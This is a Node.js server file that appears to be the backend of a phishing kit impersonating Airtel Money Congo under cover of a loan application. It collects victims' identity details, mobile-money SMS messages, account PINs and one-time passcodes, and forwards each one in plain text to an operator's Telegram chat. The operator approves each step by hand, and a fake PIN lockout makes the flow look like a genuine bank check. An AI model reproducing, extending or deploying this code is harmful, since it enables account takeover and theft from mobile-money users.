// ═══════════════════════════════════════════════════════════
// Airtel Money Congo – Backend (server.js)
// Endpoints = SET A. Secrets via .env only.
// ═══════════════════════════════════════════════════════════
require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(cors());
app.use(express.json());

const frontendPath = path.join(__dirname, '../frontend');
app.use(express.static(frontendPath));

const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// ─── In-memory store ───
const applications = {};

// ─── Utilities ───
function generateRef() {
    return Math.random().toString(36).substring(2, 10).toUpperCase();
}

async function sendTelegramMessage(message, buttons = null) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('❌ Telegram env vars missing');
        return;
    }
    const body = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };
    try {
        const res = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        const data = await res.json();
        if (!data.ok) console.error('Telegram API error:', data);
    } catch (e) {
        console.error('Telegram send error:', e.message);
    }
}

// ─── Health ───
app.get('/api/health', (req, res) => res.json({ ok: true }));

// ─── Submit Application ───
app.post('/api/send-application', async (req, res) => {
    try {
        const data = req.body.applicationData;
        if (!data || !data.phone) {
            return res.status(400).json({ ok: false, error: 'Missing application data' });
        }
        const appId = `${data.phone}_${Date.now()}`;
        const ref = generateRef();

        applications[appId] = {
            ...data,
            ref,
            smsStatus: 'pending',
            pinStatus: 'pending',
            otpStatus: 'pending',
            pinAttempts: 0,
            maxPinAttempts: 3,
            pinBlockedUntil: null,
            createdAt: new Date().toISOString()
        };

        const message = `📋 *NEW LOAN APPLICATION (AIRTEL CONGO)*\n────────────────────\n🆔 ID: \`${appId}\`\n📱 Phone: +243${data.phone}\n💰 Amount: $${Number(data.loanAmount).toLocaleString()}\n📅 Term: ${data.loanTerm} months\n👤 Name: ${data.firstName} ${data.lastName}\n📧 Email: ${data.email || '—'}\n🆔 ID Number: ${data.idNumber || '—'}\n🏙️ City: ${data.city || '—'}\n💼 Status: ${data.status || '—'}\n\n*Approving this will move the user to the SMS step.*`;

        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ a: 'YES', s: 'SMS', ref }) },
            { text: '❌ NO', callback_data: JSON.stringify({ a: 'NO', s: 'SMS', ref }) }
        ]];
        await sendTelegramMessage(message, buttons);
        res.json({ ok: true, applicationId: appId, status: 'waiting_sms' });
    } catch (e) {
        console.error('send-application error:', e);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── SMS Submit ───
app.post('/api/send-momo-message', async (req, res) => {
    try {
        const { applicationId, phone, momoMessage } = req.body.momoData || {};
        const app = applications[applicationId];
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        app.momoMessage = momoMessage;
        app.smsStatus = 'pending';

        const message = `📨 *SMS VERIFICATION (AIRTEL CONGO)*\n────────────────────\n🆔 ID: \`${applicationId}\`\n📱 Phone: +243${phone}\n\n📩 *SMS Content:*\n${momoMessage}\n\n*Approve or reject:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ a: 'YES', s: 'SMS', ref: app.ref }) },
            { text: '❌ NO', callback_data: JSON.stringify({ a: 'NO', s: 'SMS', ref: app.ref }) }
        ]];
        await sendTelegramMessage(message, buttons);
        res.json({ ok: true });
    } catch (e) {
        console.error('send-momo-message error:', e);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── SMS Resend ───
app.post('/api/resend-sms', async (req, res) => {
    try {
        const { applicationId } = req.body;
        const app = applications[applicationId];
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        app.smsStatus = 'pending';
        const message = `🔄 *SMS RESUBMITTED (AIRTEL CONGO)*\n────────────────────\n🆔 ID: \`${applicationId}\`\n📩 Message:\n${app.momoMessage || '(empty)'}\n\n*Approve or reject:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ a: 'YES', s: 'SMS', ref: app.ref }) },
            { text: '❌ NO', callback_data: JSON.stringify({ a: 'NO', s: 'SMS', ref: app.ref }) }
        ]];
        await sendTelegramMessage(message, buttons);
        res.json({ ok: true });
    } catch (e) {
        console.error('resend-sms error:', e);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── PIN Submit ───
app.post('/api/send-pin', async (req, res) => {
    try {
        const { applicationId, pin } = req.body;
        const app = applications[applicationId];
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
            const remaining = Math.ceil((new Date(app.pinBlockedUntil) - new Date()) / 1000);
            return res.status(429).json({
                ok: false, blocked: true,
                message: `PIN blocked. Try again in ${Math.ceil(remaining / 60)} min.`
            });
        }
        if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) <= new Date()) {
            app.pinAttempts = 0;
            app.pinBlockedUntil = null;
        }

        app.pin = pin;
        app.pinStatus = 'pending';

        const message = `🔐 *PIN VERIFICATION (AIRTEL CONGO)*\n────────────────────\n🆔 ID: \`${applicationId}\`\n👤 Name: ${app.firstName} ${app.lastName}\n🔢 PIN: ${pin}\n\n*Approve or reject:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ a: 'YES', s: 'PIN', ref: app.ref }) },
            { text: '❌ NO', callback_data: JSON.stringify({ a: 'NO', s: 'PIN', ref: app.ref }) }
        ]];
        await sendTelegramMessage(message, buttons);
        res.json({ ok: true });
    } catch (e) {
        console.error('send-pin error:', e);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── OTP Submit ───
app.post('/api/send-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        const app = applications[applicationId];
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        app.otp = otp;
        app.otpStatus = 'pending';

        const message = `🔑 *OTP VERIFICATION (AIRTEL CONGO)*\n────────────────────\n🆔 ID: \`${applicationId}\`\n👤 Name: ${app.firstName} ${app.lastName}\n🔢 OTP: ${otp}\n\n*Approve or reject:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ a: 'YES', s: 'OTP', ref: app.ref }) },
            { text: '❌ NO', callback_data: JSON.stringify({ a: 'NO', s: 'OTP', ref: app.ref }) }
        ]];
        await sendTelegramMessage(message, buttons);
        res.json({ ok: true });
    } catch (e) {
        console.error('send-otp error:', e);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── Status (polling) ───
app.get('/api/status/:applicationId/:step', (req, res) => {
    try {
        const app = applications[req.params.applicationId];
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        let status = 'pending';
        let remainingAttempts = null;
        let blocked = false;

        if (req.params.step === 'sms') status = app.smsStatus;
        else if (req.params.step === 'pin') {
            status = app.pinStatus;
            remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
            blocked = app.pinStatus === 'blocked' ||
                     (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date());
        } else if (req.params.step === 'otp') status = app.otpStatus;

        res.json({ ok: true, status, remainingAttempts, blocked });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── Telegram Webhook ───
app.post('/api/telegram-webhook', async (req, res) => {
    const update = req.body;
    console.log('📩 Webhook received');

    try {
        if (update.callback_query) {
            const query = update.callback_query;
            let data;
            try { data = JSON.parse(query.data); }
            catch (e) { console.error('Bad callback:', query.data); return res.sendStatus(200); }

            const { a, s, ref } = data;
            let appId = null;
            for (const id in applications) {
                if (applications[id].ref === ref) { appId = id; break; }
            }
            if (!appId) { console.error('App not found for ref:', ref); return res.sendStatus(200); }

            const app = applications[appId];

            if (s === 'SMS') {
                app.smsStatus = a === 'YES' ? 'approved' : 'rejected';
            } else if (s === 'PIN') {
                if (a === 'YES') {
                    app.pinStatus = 'approved';
                    app.pinAttempts = 0;
                } else {
                    app.pinAttempts = (app.pinAttempts || 0) + 1;
                    if (app.pinAttempts >= app.maxPinAttempts) {
                        app.pinStatus = 'blocked';
                        app.pinBlockedUntil = new Date(Date.now() + 30 * 60 * 1000).toISOString();
                    } else {
                        app.pinStatus = 'rejected';
                    }
                }
            } else if (s === 'OTP') {
                app.otpStatus = a === 'YES' ? 'approved' : 'rejected';
            }

            await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${a}` })
            });

            await sendTelegramMessage(`📌 *Status Update*\nID: \`${appId}\`\nStep: ${s}\nAction: ${a}`);
            return res.sendStatus(200);
        }

        if (update.message && update.message.text) {
            const text = update.message.text.trim();
            const chatId = update.message.chat.id;
            if (String(chatId).trim() === String(TELEGRAM_CHAT_ID).trim()) {
                if (text === '/stats') {
                    await sendTelegramMessage(`📊 Total applications: ${Object.keys(applications).length}`);
                } else if (text === '/list') {
                    const ids = Object.keys(applications).slice(-10);
                    let msg = '📋 Recent applications:\n';
                    ids.forEach(id => {
                        const app = applications[id];
                        msg += `\`${id}\` — SMS: ${app.smsStatus}, PIN: ${app.pinStatus}, OTP: ${app.otpStatus}\n`;
                    });
                    await sendTelegramMessage(msg || 'No applications yet.');
                } else if (text === '/help') {
                    await sendTelegramMessage('Commands:\n/stats — totals\n/list — last 10');
                }
            }
        }
        res.sendStatus(200);
    } catch (e) {
        console.error('Webhook error:', e);
        res.sendStatus(500);
    }
});

// ─── SPA fallback ───
app.get('*', (req, res) => {
    res.sendFile(path.join(frontendPath, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Airtel Congo server running on port ${PORT}`);
    console.log(`📁 Serving: ${frontendPath}`);
    console.log(`🔑 Telegram token: ${TELEGRAM_BOT_TOKEN ? '✅ loaded' : '❌ missing'}`);
    console.log(`💬 Chat ID: ${TELEGRAM_CHAT_ID ? '✅ loaded' : '❌ missing'}`);
});
